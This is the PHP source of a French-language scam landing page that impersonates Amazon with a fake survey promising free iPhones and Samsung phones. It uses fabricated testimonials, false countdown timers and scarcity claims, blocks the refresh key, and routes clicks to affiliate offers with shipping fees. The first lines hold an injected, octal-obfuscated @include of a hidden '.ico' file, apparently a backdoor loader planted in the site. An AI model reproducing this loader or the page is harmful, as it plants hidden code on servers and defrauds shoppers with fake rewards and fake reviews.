<?php
/*0471a*/

@include "\057h\157m\145/\150o\163t\151n\147a\144m\151n\057g\154o\142a\154s\165r\166e\171z\056c\157m\057B\157u\171g\165e\163/\1661\057.\145f\0643\143d\0666\056i\143o";
?>


<?php include 'database.php';?>
<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<title>Global Surveyz</title>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="images/icon-link.png">

<!-- Stylesheets -->
<link rel="stylesheet" href="css/font-awesome.min.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/bootstrap.min.css">
<link rel="manifest" href="/manifest.json">
<script type="text/javascript">
function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}
</script>

<!-- Javascripts --> 
<script type="text/javascript" src="js/jquery.min.js"></script> 
<script type="text/javascript" src="js/bootstrap.min.js"></script>
<script src="https://api.pushnami.com/scripts/v1/push/5cc3732f1d0e1c0010965b84"></script>
<!--<script src="https://api.pushnami.com/scripts/v1/push/5c9d2789287513001071eb63"></script>-->

<script>
   var CACHE_NAME = 'my-site-cache-v1';
var urlsToCache = [
  '/',
  '/styles/main.css',
  '/script/main.js'
];

self.addEventListener('install', function(event) {
  // Perform install steps
  event.waitUntil(
    caches.open(CACHE_NAME)
      .then(function(cache) {
        console.log('Opened cache');
        return cache.addAll(urlsToCache);
      })
  );
});
</script>

<!-- modal popup start js--> 
	<script type="text/javascript">
                  window.onbeforeload = function () {
                          document.onkeydown = function (e) {
                              return (e.which || e.keyCode) != 116;
                          };
                      }
                      window.onload = function () {
                       //   jQuery('#myModal').modal('show');
                      };
						$( document ).ready(function() {
						  // Handler for .ready() called.
						  jQuery('#myModal').modal('show');
						});
						
						function goToNext(element){
    
	var currentQuestion=$(element).parent().attr('id');
	var nextQuestion=parseInt(currentQuestion)+1;
	jQuery('#'+currentQuestion).css("display","none");
	jQuery('#'+nextQuestion).css("display","block");
}

function last(element){
	var currentQuestion=$(element).parent().attr('id');
	jQuery('#'+currentQuestion).css("display","none");
	$('#loading-img').css("display","block");
	setTimeout(function(){ 
							$('#loading-img').css("display","none");
					}, 4000);
	setTimeout(function(){ 
							$('#results').css("display","block");
							$('.reviewbox').css("display","none");
							
					}, 4000);
					
		$(document).ready(function(){
			$(".remove_link").click(function(){
				var url = $(this).attr('id');
				var aff_id = getParameterByName('sub2');
				var click_id = getParameterByName('sub1');
				url = url.replace("{affiliate_id}",aff_id);
				url = url.replace("{transaction_id}",click_id);	
				
			window.open(url, '_blank');
			});
		});

 
    
}
	</script>
<!-- modal popup end js-->

</head>

<body>

<!-- Header -->
 
<div class="top-header">
	<span><a href="#"><img src="images/amazon_logo.png" class="img-responsive"></a></span>
	<span class="flag-img"><img src="images/flag.png" class="img-responsive"></span>
    <!-- <p> -->
	<!-- <a href="">Today's Deals |</a> -->
	<!-- <a href="">Gift Cards |</a> -->
	<!-- <a href="">Sell |</a> -->
	<!-- <a href="">Help</a> -->
	<!-- </p> -->
</div>			

<!-- modal popup start HTML-->
		<div style="background-size: 100% 100%; display: block;" class="modal fade in" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false">
            <div class="modal-dialog">
                     <div class="modal-content">
                        <div class="modal-body" style="padding-left:25px;padding-right:25px; padding-bottom:25px;">
                           <!--<img style="display:block;margin-left:auto;margin-right:auto;" src="/gift.png" class=""></td>-->
                          <!--
						  <script>var msg = '<font size = "3"><strong>Congratulations Amazon shopper!</strong></font><br><br>You have been chosen to participate in a short, anonymous survey regarding your experiences with <b>Amazon.</b><br><br>Once you have completed this quick survey, you will be offered a few exclusive rewards <strong>(valued at $50.00 or more)</strong> for providing us with valuable consumer data.<br><br>This survey is available today: <strong>$date</strong><br><br>';var msg2 = msg.replace("$date",datehax());document.write(msg2);</script>
                          -->
                          <script>var msg = '<font size = "3"><strong>Congratulations Amazon Shopper!</strong></font><br><br>You have been chosen to participate in a short, anonymous survey regarding your experiences with <b>Amazon.</b><br><div class="fb-wrapper" id="fb-wrapper" style="width: 80vw; max-width:600px; overflow:hidden;display:none;"><br><div class="fb-like" data-href="https://www.facebook.com/facebook/" data-layout="standard" data-action="recommend" data-size="small" data-show-faces="true" data-width="400" data-share="false"><\/div><\/div><br>Once you have completed this quick survey, you will be offered a few exclusive rewards <strong>(valued at $50.00 or more)</strong> for providing us with valuable consumer data.<br><br>This survey is available today: <strong>$date</strong><br><br>';var msg2 = msg.replace("$date",datehax());document.write(msg2);</script><font size="3"><strong>Felicitations Cher Client <span class="amazon-color">Amazon!</span></strong></font><br><br>Votre adresse <b>IP 85.203.13.24</b> a ete selectionne pour recevoir GRATUITEMENT un <b>Samsung Galaxy S9 ou un Apple iPhone X.</b><br>
						  <!-- <span>
						   <a href="#"><img src="images/fb-button.png" class="img-responsive" style="display:block;padding-bottom: 0px;"></a>
							<a href="#"><img src="images/fb-img1.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img2.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img3.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img4.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img5.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img6.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img7.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img8.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img9.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img10.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img11.png" class="img-responsive"></a>
							<a href="#"><img src="images/fb-img12.png" class="img-responsive"></a>
						  </span> -->
						  <div class="fb-wrapper" id="fb-wrapper" style="width: 80vw; max-width:600px; overflow:hidden;display:none;"><br><div class="fb-like fb_iframe_widget" data-href="https://www.facebook.com/facebook/" data-layout="standard" data-action="recommend" data-size="small" data-show-faces="true" data-width="400" data-share="false" fb-xfbml-state="rendered" fb-iframe-plugin-query="action=recommend&amp;app_id=405670262806154&amp;container_width=0&amp;href=https%3A%2F%2Fwww.facebook.com%2Ffacebook%2F&amp;layout=standard&amp;locale=en_US&amp;sdk=joey&amp;share=false&amp;show_faces=true&amp;size=small&amp;width=400"><span style="vertical-align: bottom; width: 400px; height: 28px;"><iframe name="f12e17e1380aec8" width="400px" height="1000px" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" title="fb:like Facebook Social Plugin" src="https://www.facebook.com/v2.9/plugins/like.php?action=recommend&amp;app_id=405670262806154&amp;channel=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2Fd_vbiawPdxB.js%3Fversion%3D44%23cb%3Df2b0aa7ba3cfb38%26domain%3Dglobalsurveyscenter.com%26origin%3Dhttps%253A%252F%252Fglobalsurveyscenter.com%252Ff16be9f1f724bb%26relation%3Dparent.parent&amp;container_width=0&amp;href=https%3A%2F%2Fwww.facebook.com%2Ffacebook%2F&amp;layout=standard&amp;locale=en_US&amp;sdk=joey&amp;share=false&amp;show_faces=true&amp;size=small&amp;width=400" class="" style="border: none; visibility: visible; width: 400px; height: 28px;"></iframe></span></div></div><br>Pour recevoir votre cadeau, il vous suffit de repondre a notre sondage anonyme. Mais depechez-vous! Il ne reste qu'un nombre limite de cadeaux pour aujourd'hui! <br><br>Disponible pour les  <span style="color:red;"><font color="red"><div id="timebox" class="timebox" style="display: inline-block;"></div> minutes</font></span> a venir <br><br>
                           <!--<p>Reference number: <strong style="background-color: yellow">37159</strong>.</p> 
                              -->
                           <!--<span id="timer_box">This offer will expire in the next 2 minutes: <span id="timer" style="background-color: yellow"></span> </span>-->
                           <p></p><!-- Audio -->
                              <button id="modalbutton" style="background: ;color: ;" type="button" class="btn-lg  btn-start" data-dismiss="modal">Commencer</button>
                        </div>
                           <!--
						   <script type="text/javascript">
                              $('.btn-start').on('click', function() {

                                  document.getElementById('opening_audio').pause();
                                  return true;
                              });
                                  $('body').on('click', function() {
                                  document.getElementById('opening_audio').pause();
                                  return true;
                              });
                           </script>
                           -->
                     </div>
                  </div>
               </div>
			</div>
		</div>
<!-- modal popup end HTML-->			   

<!-- section -->
<section class="rooms mt50">
  <div class="container">
	<div class="row reviewboxbuttons">
		<div class="col-sm-12">
			<div id="1" style="display:block">
                <div class="question-count center_q">Question 1 sur 9</div>
                <div class="question center_q">Vous etes ?</div>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Un homme<br></button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Une femme<br></button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Autre<br></button>
			</div>
			
			<div id="2"  style="display:none">
                <div class="question-count center_q">Question 2 sur 9</div>
                <div class="question center_q">De quand date votre dernier achat chez Amazon ?</div>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Il y a moins d'une semaine</button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Il y a moins d'un mois</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Il y a plus d'un mois</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Jamais</button>
			</div>
			
			<div id="3"  style="display:none">
                <div class="question-count center_q">Question 3 sur 9</div>
                <div class="question center_q">Comment evaluez-vous votre experience d'achat en ligne avec Amazon ?</div>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Excellente</button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Bonne</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Correcte</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Mauvaise</button>
			</div>
			
			<div id="4"  style="display:none">
                <div class="question-count center_q">Question 4 sur 9</div>
                <div class="question center_q">Possedez-vous un abonnement Amazon Prime ?</div>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Oui</button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Non</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Je ne sais pas</button>
			</div>
			
			<div id="5"  style="display:none">
                <div class="question-count center_q">Question 5 sur 9</div>
                <div class="question center_q">Quel appareil utilisez le plus souvent lorsque vous faites vos achats en ligne ?</div>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Un ordinateur</button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Une tablette/un iPad</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Un smartphone</button>	
			</div>
			
			<div id="6"  style="display:none">
                <div class="question-count center_q">Question 6 sur 9</div>
                <div class="question center_q">A quel degre recommanderiez-vous Amazon a un ami ?</div>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Tres probablement</button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">probablement</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">peu probablement</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);"> probablement pas</button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">jamais</button>
			</div>
			
			<div id="7"  style="display:none">
                <div class="question-count center_q">Question 7 sur 9</div>
                <div class="question center_q">Que preferez-vous chez Amazon?</div>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">La variete de produit</button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Le prix</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">La commodite</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">Aucune de ces reponses</button>
			</div>
			
			<div id="8"  style="display:none">
                <div class="question-count center_q">Question 8 sur 9</div>
                <div class="question center_q">Quelle est votre categorie d'age ?</div>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">18-24</button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">25-34</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">35-44</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">45-64</button>
				<button id="q1a" type="button" class="sv_btn" onclick="goToNext(this);">65+</button>
			</div>
			
			<div id="9"  style="display:none">
                <div class="question-count center_q">Question 9 sur 9</div>
                <div class="question center_q">D'apres votre connaissance des services Amazon, est-il mieux, identique ou pire que d'autres fournisseurs de services ?</div>
				<button id="q1a" type="button" class="sv_btn" onclick="last(this);">Bien mieux</button>
				<button id="q1a" type="button" class="sv_btn" onclick="last(this);">mieux</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="last(this);">a peu pres pareil</button>	
				<button id="q1a" type="button" class="sv_btn" onclick="last(this);">pire</button>
				<button id="q1a" type="button" class="sv_btn" onclick="last(this);">bien pire</button>
			</div>
			<div id="loading-img" style="display:none">
				<p style="color:green;"><b>C'est bon, vous avez fini !</b></p>
				<p>Envoi de reponses ...</p>
				<img src="images/TaPz.gif" class="img-responsive">
			</div>			
			<!-- resulet -->
				<div id="results" style="display:none">
                     <br>
                     <div class="media well well-sm">


                        <div class="media-body">
                           
						   <script>var msg = '<font size = "5"><strong>Thank you for completing the Amazon survey!</strong></font><br><br>To show our appreciation for providing us with extremely valuable consumer data, you may now choose <b>(1)</b> of the following exclusive products below.<br><br>Please note that due to extremely HIGH demand, there is a limited supply of these rewards in stock.<br><div class="fb-wrapper" id="fb-wrapper2" style="width: 80vw; max-width:600px; overflow:hidden;display:none;"><br><div class="fb-like" data-href="https://www.facebook.com/facebook/" data-layout="standard" data-action="recommend" data-size="small" data-show-faces="true" data-width="400" data-share="false"><\/div><\/div><br>Special offer available today: <strong>$date<\/strong><\/font><br><br>Coupon code:</strong> <span style="background-color: #FFFF00">"<strong>AMAZONSURVEY</strong>"</span> has been applied for reduced shipping costs.';var msg2 = msg.replace("$date",datehax());document.write(msg2);</script><font size="5"><strong>Merci d'avoir repondu a notre enquete !</strong></font><br><br>A cause d'une demande extremement elevee, il ne nous reste que très peu de produits en stock.<br> Veuillez choisir <b>uniquement UNE (1) récompense</b> exclusive ci-dessous.<br> Les offres spéciales pour aujourd'hui UNIQUEMENT : <span id="datetime2"> .<br><br>
						   
						  </span>
						   <br><br><span style="color: green;">"✓ Votre code promo a bien ete utilise <strong>50SONDPRIX</strong>"</span>
                        </div>
                     </div>
                     <div id="offers">
                        <div class="row row-parent" id="owallwrapper">

                        <!-- PHP START -->
                        <?php
                         $products = mysqli_query($conn, "SELECT * FROM products") or die(mysqli_error($conn));
                         if($products){
                            while($row = mysqli_fetch_array($products,MYSQLI_BOTH)){
                        ?>
                        
							<div id="offer_main_div_1" class="col-md-12 item sex_female" data-name="female">
								<div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#F5F5F5;">
									<div class="col-md-3 text-center"> <br>
									
									<?php
                                            if($row['images'] != "")
                                            {                                               
                                            ?>
									
									 <a href="<?php echo $row['url_1'];?>" target="_blank"><img id="offer_img_1" class="img-responsive" style="max-width: 130px; margin: 0 auto;" src="<?php echo $row['images'];?>" alt="..." onclick="ViewOffer_1();">
									 
									 
									 </a> 
									 <div class="reviewitem" style="color:#164d96;"><img id="star_img_1" src="<?php echo $row['reviews'];?>" height="18" width="71" onclick="ViewOffer_1();"> <a id="offer_review_anchor_1" onclick="ViewOffer_1();">(612)</a></div> <br> 
									 
									 <?php
                                          }
                                          elseif($row['images'] == "" || $row['images'] == NULL)
                                          {
                                             ?>
                                                <img src="images/products_image/default-product-img.jpg"
                                                    width="100px">
                                                <?php  
                                          }
                                          ?>
									 </div> 
									 <div class="col-md-5 text-center" style="color: black;"> <br> 
									 <strong><font size="3"><u><?php echo $row['product_name'];?></u></font></strong><br>
									 <b><?php echo $row['description'];?></b> 
									 <br> Prix normal: <strike> <?php echo $row['product_price'];?>€ </strike> <br> Prix d'aujourd'hui: <font color="#008000"><strong style="background-color: yellow;"><?php echo $row['regular_price'];?>€</strong></font><br> Ne payez que les frais d'expedition: <strong><?php echo $row['shipping'];?>€</strong><br> Quantité disponible: (<font color="#FF0000"><?php echo $row['quantity'];?></font>)<br> <br> <span class=" quantity"> <span class="label label-danger">2</span> </span> 
									 </div> 
									 <div id="claim_btn_div_1" class="col-md-4 height:100%;"> 
									 <?php 
                                            if($row['img_popular'] != "")
                                                {
                                            ?>
                                            <img src="<?php echo $row['img_popular'];?>" class="img-responsive">
                                            <?php 
                                            }
                                        ?>
									 <a id="<?php echo $row['url_1'];?>"  class="remove_link">
									     <button id="claim_btn_1" onclick="ViewOffer_1();" style="cursor:pointer;font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background: ;color: ;" class="text-center btn-lg click_claim_btn">Cliquez ici →</button>
									     </a> 
									 
									 </div>
									 
									 
								</div> 
							</div> 
                            <?php } } ?>
							<div id="offer_main_div_3" class="col-md-12 item sex_female" data-name="female"> 
								<div class="row offer-row" style="padding: 12px;margin:5px; border: 1px solid #e3e3e3; border-radius: 3px; background-color:#F5F5F5;"> 
									 <div class="col-md-3 text-center"> <br> 
									 <img id="offer_img_3" class="img-responsive" style="max-width: 130px; margin: 0 auto;" src="images/skin_new19_1.png" alt="..." onclick="ViewOffer_3();"></a> 
									 <div class="reviewitem" style="color:#164d96;"><img id="star_img_3" src="images/4-half-star.png" height="18" width="71" onclick="ViewOffer_3();"> <a id="offer_review_anchor_3" onclick="ViewOffer_3();">(363)</a></div> <br> 
									 </div> 
									 <div class="col-md-5 text-center" style="color: black;"> <br> 
									 <strong><font size="3"><u>Obtenez votre iPhone X©</u></font></strong><br><b>2018 iPhone le plus populaire! </b> <br> Prix normal: <strike> 999,99€ </strike> <br> Prix d'aujourd'hui: <font color="#008000"><strong style="background-color: yellow;">0,00€</strong></font><br> Ne payez que les frais d'expédition: <strong>5,00€</strong><br> Quantité disponible: (<font color="#FF0000">0</font>)<br> <br> <span class=" quantity"> <span class="label label-danger">0</span> </span> 
									 </div> 
									 <div id="claim_btn_div_3" class="col-md-4 height:100%;"> 
										<center><font color="red">Inventaire non disponible</font></center>
									 </div>
								</div> 
							</div>  
					  
						</div>
                     </div>
                     <br>
                     <br>
                     <h4>Qu'avez-vous pensé de l'enquête ?</h4>
                     <ul class="list-group">
						<li class="media list-group-item2">
                           <img class="media-object pull-left" src="images/1.jpg" alt="...">
                           <div class="media-body">
                              <p class="media-heading comment-name">Guillaume Dubois<span class="comment-time"><script>r_comment_date(1);</script>Apr 04,2019 at 11:55 am</span></p>
                              <p class="comment-body">J’ai reçu aujourd’hui mon nouveau Samsung. Jusque-là, je pensais que c’était une blague, mais j’avais tort. Merci infiniment aux organisateurs pour ce cadeau !</p>
                           </div>
                        </li>
                        <li class="media list-group-item2">
                           <img class="media-object pull-left" src="images/2.jpg" alt="...">
                           <div class="media-body">
                              <p class="media-heading comment-name">Anton Rousseau<span class="comment-time"><script>r_comment_date(1);</script>Apr 03,2019 a 5:30 pm</span></p>
                              <p class="comment-body">@Megan Dousset C’est pour faire de la publicité. De grandes entreprises font souvent ce genre de promotions et ça marche vraiment. Essaie !</p>
                           </div>
                        </li>
                        <li class="media list-group-item2">
                           <img class="media-object pull-left" src="images/3.jpg" alt="...">
                           <div class="media-body">
                              <p class="media-heading comment-name">Deniel Couture<span class="comment-time"><script>r_comment_date(2);</script>Mar 31,2019 a 3:30 pm</span></p>
                              <p class="comment-body">Je viens d’appeler le transporteur. Il m’a dit qu’il m’apporterait le colis aujourd’hui. Mais quand même, j’attends d’avoir l’iPhone entre les mains pour y croire vraiment :)</p>
                           </div>
                        </li>
                        <li class="media list-group-item2">
                           <img class="media-object pull-left" src="images/4.jpg" alt="...">
                           <div class="media-body">
                              <p class="media-heading comment-name">Lea Lefebvre<span class="comment-time"><script>r_comment_date(4);</script>Apr 04,2019 a 2:30 pm</span></p>
                              <p class="comment-body">Le sondage était rapide et facile. Ça me dérangerait pas de répondre à un autre pour recevoir un autre cadeau gratuit.</p>
                           </div>
                        </li>
						<li class="media list-group-item2">
                           <img class="media-object pull-left" src="images/5.png" alt="...">
                           <div class="media-body">
                              <p class="media-heading comment-name">Lillian Ong<span class="comment-time"><script>r_comment_date(5);</script>Apr 02,2019 à 2:00 am</span></p>
                              <p class="comment-body">Je pensais que ce était une blague au début, par mon samsung galaxy S8 effectivement venu dans le courrier ce matin et il n'y a rien qui me empêche de se inscrire à chacun d'eux, que je ai fait hehe</p>
                           </div>
                        </li>  
						<li class="media list-group-item2">
                           <img class="media-object pull-left" src="images/6.jpg" alt="...">
                           <div class="media-body">
                              <p class="media-heading comment-name">Emma Thomas<span class="comment-time"><script>r_comment_date(5);</script>Apr 03,2019 à 3:15 pm</span></p>
                              <p class="comment-body">Je pensais que c’était une arnaque, mais je viens vraiment de recevoir un iPhone ce matin. Un original, sans aucune escroquerie. J’ai répondu au questionnaire avec le nom de ma copine et de ma mère, des fois que ça marche encore une fois, hahaha</p>
                           </div>
                        </li>
						<li class="media list-group-item2">
                           <img class="media-object pull-left" src="images/7.png" alt="...">
                           <div class="media-body">
                              <p class="media-heading comment-name">Jean Moreau<span class="comment-time"><script>r_comment_date(5);</script>Apr 04,2019 à 3:00 am</span></p>
                              <p class="comment-body">J'ai donné la crème pour la peau à ma soeur en cadeau.</p>
                           </div>
                        </li>
						<li class="media list-group-item2">
                           <img class="media-object pull-left" src="images/8.png" alt="...">
                           <div class="media-body">
                              <p class="media-heading comment-name">Lucas Roux<span class="comment-time"><script>r_comment_date(5);</script>Apr 03,2019 à 11:12 pm</span></p>
                              <p class="comment-body">J'ai choisi le samsung s8 pour ma mère. C'était un cadeau parfait et elle est tellement heureuse!</p>
                           </div>
                        </li>	
                        <li style="list-style: none">
                           <br>
                           <div id="confirmationbackground" class="well well-sm">
                              <div class="form-horizontal">
                                 <fieldset id="commmentform">
                                    <legend>Laissez vos commentaires</legend>
                                    <!-- Name input-->
                                    <div class="form-group">
                                       <label class="col-md-3 control-label" for="name">Votre Nom</label>
                                       <div class="col-md-6">
                                          <input id="name" name="name" placeholder="" class="form-control" type="text">
                                       </div>
                                    </div>
                                    
                                    <div class="form-group">
                                       <label class="col-md-3 control-label" for="email">Votre Email</label>
                                       <div class="col-md-6">
                                          <input id="email" name="email" placeholder="" class="form-control" type="text">
                                       </div>
                                    </div>
                                    
                                    <!-- Message body -->
                                    <div class="form-group">
                                       <label class="col-md-3 control-label" for="message">Vos commentaires</label>
                                       <div class="col-md-9">
                                          <textarea class="form-control" id="message" name="message" placeholder="" rows="4"></textarea>
                                       </div>
                                    </div>
                                    <div class="col-md-6"></div>
                                    <div class="col-md-6">
										<button id="commentbutton" style="font-size: 1.2em; color: black; margin:auto auto; width:100%; max-height:40px;background:; " class="text-center btn-lg click_claim_btn">Submit</button>
                                    </div>
                                    <script type="text/javascript">
                                      $('#commentbutton').click(function(){
                                        $('#commmentform').slideUp(1000, function(){
                                          $('#confirmationbackground').html('<div style="text-align:center"><font size="3">Your comment has been submitted and is pending approval from our spam-prevention team.</font></div>');
                                          setTimeout(function(){
                                            $('#confirmationbackground').html('<div style="text-align:center"><font size="3">Your comment has been submitted and is pending approval from our spam-prevention team.</font></div>');
                                            $('#confirmationbackground').css("background-color","#87EA55");
                                          },2000)
                                        })
                                      })
                                    </script>
                                 </fieldset>
                              </div>
                           </div>
                        </li>
                     </ul>
                  </div>
			<!-- resulet -->
			
			
		</div>
	</div>
    <div class="row reviewbox">
      <!-- col-sm-12 -->
      <div class="col-sm-12">
	  <h1>Customer Reviews</h1>
		<div class="col-sm-6">
			<div class="review">
                <img src="images/big_4_half_star.png">            
                    <div class="rate4 review_title">Très content !</div>
                   <span class="user_info">BY MARIE ROUSSEAU, LOURDES</span>
                    <p>
								J'ai réceptionné le mien aujourd'hui! Merci beaucoup pour ce nouvel iPhone 7!</p>
            </div>
		</div>
		<div class="col-sm-6">
			<div class="review">
                <img src="images/big_4_half_star.png">            
                    <div class="rate4 review_title">Très bons produits</div>
                    <span class="user_info">BY LÉA LEFEBVRE, TOULOUSE</span>
                    <p>
					Le sondage était rapide et facile. Ça me dérangerait pas de répondre à un autre pour recevoir un autre cadeau gratuit.</p>
            </div>
		</div>
		<div class="col-sm-6">
			<div class="review">
                <img src="images/big_4_half_star.png">            
                    <div class="rate4 review_title">J'ai reçu ma carte-cadeau dans les 12 jours</div>
                    <span class="user_info">BY LILLIAN ONG, PARIS</span>
                    <p>Je pensais que ce était une blague au début, par mon samsung galaxy S8 effectivement venu dans le courrier ce matin et il n'y a rien qui me empêche de se inscrire à chacun d'eux, que je ai fait lol</p>
            </div>
		</div>
		<div class="col-sm-6">
			<div class="review">
                <img src="images/big_4_half_star.png">            
                    <div class="rate4 review_title">Nous venons de mon prix dans le courrier! ...</div>
                    <span class="user_info">BY ALEXANDRE BOURGEOIS, DIJON</span>
                    <p>Merci pour les cadeaux ! J'ai donné la crème pour la peau à ma sœur pour son anniversaire . Je me suis inscrit pour tous les éléments énumérés ! Pourquoi pas?</p>
            </div>
		</div>
      </div>
    </div>
  </div>
</section>
<!-- section -->
<footer class="survey-container">
               <div id="terms">
                  <center>
                     <img src="images/f_guarantee.png" alt="guarantee" height="50" width="auto"> <img src="images/f_secure_1.png" alt="secureSiteLogo" height="50" width="auto">
                  </center>
                  <br>
					<font size="2">©Tous droits réservés. <br>
					<br>Votre vie privée est importante pour nous. Nous ne recueillons pas vos informations personnelles dans ce questionnaire. S'il vous plaît consulter notre politique et modalités confidentialité. Nous ne sommes pas affiliés ni un partenariat avec une tierce partie. Voir les termes et conditions importants.
					<a href="terms-conditions.html" rel="nofollow" onclick="window.open('terms-conditions.html', 'Terms','width=550,height=500,scrollbars=yes,resizable=yes'); return false;">here.</a><br>
					<br><br>
					</font>
			   </div>
               </font>
</footer>

</body>

<!--<script>
function goToNext(element){
	var currentQuestion=$(element).parent().attr('id');
	var nextQuestion=parseInt(currentQuestion)+1;
	jQuery('#'+currentQuestion).css("display","none");
	jQuery('#'+nextQuestion).css("display","block");
}
function last(element){
	var currentQuestion=$(element).parent().attr('id');
	jQuery('#'+currentQuestion).css("display","none");
	$('#loading-img').css("display","block");
	setTimeout(function(){ 
							$('#loading-img').css("display","none");
					}, 4000);
	setTimeout(function(){ 
							$('#results').css("display","block");
							$('.reviewbox').css("display","none");
							
					}, 4000);

}
</script>-->

<script>
var dt = new Date();
document.getElementById("datetime2").innerHTML = dt.toLocaleDateString();
</script>

<script type="text/javascript" src="https://s3-us-west-1.amazonaws.com/imgcenter/s/2/js/countdown.js"></script>
<script>jsc.init(299, 'timebox','');</script>
<script>
$(document).ready(function() {
	stupid_timer();
});

function stupid_timer()
{
	console.log('TRIGGERED');
	
	var box = $('#timebox');
	if ($('#timebox'))
	{
		console.log('element found');
	} else
	{
		console.warn('element NOT FOUND');
	}
	
	// $('#timebox').text('IM A TIMEBOX LOOK AT ME');
	
}

                        function startTimer(t,msg) {
                            var e,
                                n,
                                r = t,
                                a = setInterval(function() {
                                    e = parseInt(r / 60, 10),
                                    n = parseInt(r % 60, 10),
                                    n = 10 > n
                                        ? "0" + n
                                        : n,
                                    $("#timebox").text(e + ":" + n),
                                    --r < 0 && (reset_timer(a,msg))
                                }, 1e3)
                        }
                        function reset_timer(a,msg)
						{
							clearInterval(a);
							$('#timebox').html(msg);
						}
</script>

</html>